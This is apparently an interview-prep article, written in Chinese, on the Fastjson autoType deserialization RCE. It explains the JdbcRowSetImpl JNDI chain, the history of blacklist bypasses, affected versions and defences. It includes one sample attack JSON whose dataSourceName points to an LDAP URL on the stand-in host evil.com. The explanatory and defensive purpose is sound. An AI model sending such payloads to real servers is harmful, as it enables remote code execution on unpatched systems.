# 你知道fastjson的反序列化漏洞吗

> 原文：https://lcnipys9u0xh.feishu.cn/wiki/JG32wd1lfirm8jks5LZcy2Gnnqf

我从原理到实践拆一下。

🔹 先给结论
知道，而且这个漏洞折磨了 Java 生态好几年。 它本质上是一类反序列化远程代码执行（RCE）漏洞，核心问题在于 Fastjson 的 autoType 机制允许通过 @type 字段指定任意类，攻击者精心构造一串 JSON，就能在服务端执行任意命令。

🔹 漏洞原理，说人话版
Fastjson 在反序列化时会根据 @type 的值去加载类，并调用该类的 setter、getter、构造方法。如果这个类的某些方法有危险操作，就会被利用。
最经典的利用链是 JNDI 注入：

1. 攻击者传入 @type 为 com.sun.rowset.JdbcRowSetImpl
1. 这个类在设置 dataSourceName 和 autoCommit 时会触发 JNDI lookup
1. 如果 JNDI 指向攻击者搭建的恶意 LDAP/RMI 服务，就会加载远程恶意类，执行命令

👉 示例攻击 JSON 大概长这样（精简版）：

```
代码块
{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://evil.com/EvilObject",
  "autoCommit": true
}
```

服务端一解析，直接中招。

🔹 历史攻防战（绕过的艺术）

这不是修一次就完事的坑，而是一场持续对抗：

- 2017 年，官方加了黑名单，把危险类禁掉
- 攻击者马上找到绕过黑名单的类（各种花式 com.sun.xxx）
- 官方又加 checkAutoType 期望类、黑白名单、限制反序列化范围
- 结果多次出现通杀绕过（比如用 expectClass 配合特殊类，或利用 java.lang.AutoCloseable 绕过）
- 直到后来默认关闭 autoType，并引入 SafeMode 才算消停

⚠️ 这期间受影响的版本从 1.2.24 一直覆盖到 1.2.68 甚至更高，很多历史系统一打一个准。

🔹 如果你在面试里被追问“怎么防”

我会按优先级说：

✅ 关闭 autoType（ ParserConfig.getGlobalInstance().setAutoTypeSupport(false) ）
✅ 升级到安全版本（如 1.2.83 及以上，高危修复干脆上 Fastjson2，默认禁用 autoType）
✅ 开启 SafeMode（直接禁用所有 @type 指定）
✅ 在 JDK 层面限制 JNDI 远程加载（如 com.sun.jndi.ldap.object.trustURLCodebase 设为 false，但 JDK 高版本已默认限制）
✅ 用 WAF/过滤器 对传入 JSON 做特征检测，但这是辅助

🔹 我自己踩过的坑
之前排查过一个老项目，日志里莫名其妙执行了外部命令，抓包一看入参里夹着 @type，差点没把我吓出一身冷汗。后来追查发现项目用的 Fastjson 版本是 1.2.47，直接暴露在公网。那之后我把公司所有项目的 Fastjson 依赖扫了一遍，强制升级到 Fastjson2 并关掉 autoType，才睡踏实。

🗣️ 如果让我一句话终结这个话题
“Fastjson 反序列化漏洞的本质是信任了攻击者指定的类型——只要有 @type 这种设计，安全边界就很容易被突破，除非你明确知道自己在干什么，否则别开 autoType。”

这类漏洞跟 Log4j 的 JNDI 注入异曲同工，核心教训就是：永远不要相信反序列化时由外部控制的类名或对象类型，那东西相当于把服务器的大门钥匙交了出去。
